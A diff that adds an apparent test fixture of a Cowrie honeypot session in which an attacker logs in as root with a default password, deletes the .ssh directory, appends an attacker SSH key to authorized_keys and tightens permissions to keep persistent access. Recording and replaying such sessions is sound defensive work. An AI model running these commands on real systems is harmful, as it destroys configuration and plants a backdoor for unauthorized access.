@@ -1,0 +1,15 @@
+{
+  "session": "seed-persist-01",
+  "src_ip": "103.149.27.88",
+  "src_port": 39882,
+  "events": [
+    { "offset": 1200, "eventid": "cowrie.session.connect", "dst_port": 2222 },
+    { "offset": 1203, "eventid": "cowrie.login.success", "username": "root", "password": "toor" },
+    { "offset": 1206, "eventid": "cowrie.command.input", "input": "id" },
+    { "offset": 1209, "eventid": "cowrie.command.input", "input": "cd home && rm -rf .ssh" },
+    { "offset": 1212, "eventid": "cowrie.command.input", "input": "mkdir .ssh" },
+    { "offset": 1215, "eventid": "cowrie.command.input", "input": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker\" >> .ssh/authorized_keys" },
+    { "offset": 1218, "eventid": "cowrie.command.input", "input": "chmod -R go= home/.ssh && cd home" },
+    { "offset": 1222, "eventid": "cowrie.session.closed" }
+  ]
+}
